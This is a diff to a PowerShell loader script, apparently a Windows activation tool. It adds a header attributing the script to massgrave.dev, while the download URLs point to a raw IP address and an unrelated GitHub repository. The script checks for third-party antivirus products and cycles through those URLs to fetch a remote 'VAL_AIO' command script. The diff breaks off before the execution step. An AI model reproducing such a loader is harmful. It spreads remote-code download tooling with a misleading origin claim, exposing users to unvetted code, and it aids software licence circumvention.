@@ -1,3 +1,5 @@
+# This script is hosted on https://get.activated.win for https://massgrave.dev
+
 function Check3rdAV {
     $avList = Get-CimInstance -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Where-Object { $_.displayName -notlike '*windows*' } | Select-Object -ExpandProperty displayName
     if ($avList) {
@@ -8,9 +10,9 @@ function Check3rdAV {
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $URLs = @(
-    'http://45.175.4.4/get/VAL_AIO.cmd',
-    'http://45.175.4.4/get/VAL_AIO.cmd',
-    'http://45.175.4.4/get/VAL_AIO.cmd'
+    'https://raw.githubusercontent.com/valberlimabr/valberlimabr.github.io/61b5ac2a10df8416fd030fa62969d187f9b2a743/get/VAL_AIO.txt',
+    'https://raw.githubusercontent.com/valberlimabr/valberlimabr.github.io/61b5ac2a10df8416fd030fa62969d187f9b2a743/get/VAL_AIO.txt',
+    'https://raw.githubusercontent.com/valberlimabr/valberlimabr.github.io/61b5ac2a10df8416fd030fa62969d187f9b2a743/get/VAL_AIO.txt'
 )
 
 foreach ($URL in $URLs | Sort-Object { Get-Random }) {
